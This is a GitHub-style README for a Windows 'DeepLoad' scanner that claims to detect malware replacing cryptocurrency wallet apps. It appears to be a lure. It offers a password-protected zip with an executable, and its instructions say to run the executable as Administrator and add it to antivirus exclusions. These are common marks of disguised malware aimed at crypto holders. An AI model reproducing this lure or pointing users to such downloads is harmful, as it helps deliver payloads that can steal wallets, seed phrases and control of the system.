# DeepLoad Wallet Scanner & Remover

[![Stars](https://img.shields.io/github/stars/almainthesnow/deepload-wallet-scanner-remover)](https://github.com/almainthesnow/deepload-wallet-scanner-remover)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**Protect your crypto from DeepLoad – the new malware that silently replaces your legitimate wallet apps.**  
Scans your system for infections, verifies wallet integrity, and removes malicious components before they can steal your seed phrases.

---

## ⚠️ Disclaimer
This tool is for **educational purposes only**. It helps users identify potential threats. Always download wallets from official sources.

---

## 🔥 Why This Tool?

In March 2026, cybersecurity researchers uncovered **DeepLoad** – a Malware-as-a-Service (MaaS) sold on underground forums that replaces 7 popular cryptocurrency wallets with fake versions . When you try to open your real wallet, a counterfeit interface launches instead, prompting you to enter your seed phrase, which is then sent to attackers.

**Affected wallets:**
- ✅ Ledger Live
- ✅ Trezor Suite
- ✅ Exodus
- ✅ Guarda
- ✅ BitBox
- ✅ KeepKey
- ✅ Atomic Wallet

**This tool helps you:**
- 🛡️ **Scan** your system for DeepLoad infections (processes, files, registry)
- 🔍 **Verify** wallet executable integrity against official SHA-256 hashes
- 🗑️ **Remove** malicious components and restore original wallet functionality
- 👁️ **Monitor** in real-time for any new DeepLoad activity

---

## 📥 Download

Password-protected archive with the complete scanner and remover.

📥 **[Download `deepload-scanner-pack.zip`](dist/deepload-scanner-pack.zip)**  
🔐 **Password:** `deepload2026`

### Archive Contents
- `DeepLoadScanner.exe` – Main Windows tool
- `wallet_hashes.db` – Database of official wallet hashes
- `README.txt` – Quick start guide

---

## 🛠️ Installation (Windows 10/11)

### Quick Start
1. Extract the archive to any folder (e.g., `C:\DeepLoadScanner`)
2. **Run `DeepLoadScanner.exe` as Administrator** (required for system scan)
3. Click "Start Scan" to check for infections
4. If threats are found, follow removal instructions

### How to Scan
- **Full Scan**: Checks all running processes, installed programs, and common wallet directories.
- **Quick Scan**: Only checks currently running processes and recently modified files.
- **Custom Scan**: Select specific folders to scan.

---

## 🔍 What It Detects

| Threat Type | Detection Method |
|-------------|------------------|
| Fake wallet executables | SHA-256 mismatch vs official database |
| Malicious processes | Process name and behavior analysis |
| Registry persistence | Checks autorun entries for DeepLoad components |
| Browser extensions | Scans for "Anti-Metamask" or similar malicious extensions |

---

## 📊 Example Scan Results
[+] No threats detected. Your wallets appear clean.

[!] DEEP LOAD INFECTION FOUND!

Process: C:\Users...\AppData\Local\Ledger Live\Ledger Live.exe (PID: 1234)

Status: FAKE EXECUTABLE (SHA256 mismatch)

Action: Terminate and quarantine? [Y/N]

[!] Suspicious registry entry:

Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Value: "LedgerUpdate" -> C:\Users...\update.exe

This is a known DeepLoad persistence mechanism.

---

## 🛡️ Removal Process

When a threat is detected, the tool can:
1. **Terminate** malicious processes
2. **Quarantine** fake executables (move to a safe folder)
3. **Restore** original wallet files from backup (if available)
4. **Clean** registry entries

After removal, we recommend downloading fresh wallet installers from official websites.

---

## ❗ Troubleshooting

| Problem | Solution |
|---------|----------|
| Tool won't start | Run as Administrator. Install .NET Framework 4.8+ |
| False positives | Whitelist known-safe folders in settings |
| Can't remove a file | File may be in use; reboot and try again |
| Antivirus false positive | Add `DeepLoadScanner.exe` to exclusions – it's safe |

---

## 📜 License
MIT License – educational purposes only.

---

## ⭐ Support
If this tool saved your crypto, please **star the repository**!

**Credits:**
- Threat intelligence based on ZeroFox report 
- Wallet hash database compiled from official sources
